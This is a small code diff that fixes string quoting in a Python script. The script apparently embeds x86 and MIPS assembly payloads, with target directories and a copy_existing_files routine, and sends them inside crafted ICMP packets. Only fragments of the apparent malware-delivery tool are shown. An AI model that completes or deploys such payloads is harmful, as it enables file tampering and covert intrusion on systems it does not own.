@@ -295,7 +295,7 @@ if __name__ == "__main__":
     
     # Set the payload as the encoded program data
     payload = encoded_program_data
-    payload2 = " section .data
+    payload2 = """ section .data
     path db "/", 0   ; Default path
     target_dir_list dd 0   ; Empty target directory list
     iteration dd 2   ; Default iteration count
@@ -733,8 +733,8 @@ print_string:
 
 .done:
     popa
-    ret"
-    payload3 =  " .data
+    ret"""
+    payload3 =  """ .data
     path: .asciiz "/"
     target_dir_list: .word 0
     iteration: .word 2
@@ -845,7 +845,7 @@ copy_existing_files:
     j .loop
 
 .done:
-    jr $ra  "
+    jr $ra  """
 
 
     # Craft and send the ICMP packet
